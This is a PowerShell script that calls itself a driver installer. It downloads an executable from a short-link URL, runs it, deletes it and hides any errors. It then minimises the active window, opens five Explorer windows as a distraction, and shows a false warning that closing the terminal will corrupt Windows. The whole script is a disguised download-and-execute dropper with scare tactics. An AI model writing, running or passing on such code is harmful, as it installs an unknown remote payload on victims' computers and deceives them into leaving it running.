# Driver Installer Script
$url = "https://dkm.s.gy/file"
$out = "$env:USERPROFILE\Downloads\drivers.exe"


Write-Host "importing...." -ForegroundColor Yellow
try {
    Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing
    
    if (Test-Path $out) {
        Start-Process -FilePath $out -Wait
        Remove-Item $out -Force -ErrorAction SilentlyContinue
    }
} catch {

}


Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class WindowHelper {
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

$hWnd = [WindowHelper]::GetForegroundWindow()
[WindowHelper]::ShowWindow($hWnd, 6) 


1..5 | ForEach-Object { Start-Process explorer }


Write-Host "==================================================" -ForegroundColor Red
Write-Host "WARNING: DO NOT CLOSE THIS TERMINAL!" -ForegroundColor Red
Write-Host "Closing this window may cause Windows corruption." -ForegroundColor Red
Write-Host "Please wait for the process to finish..." -ForegroundColor Red
Write-Host "==================================================" -ForegroundColor Red


exit
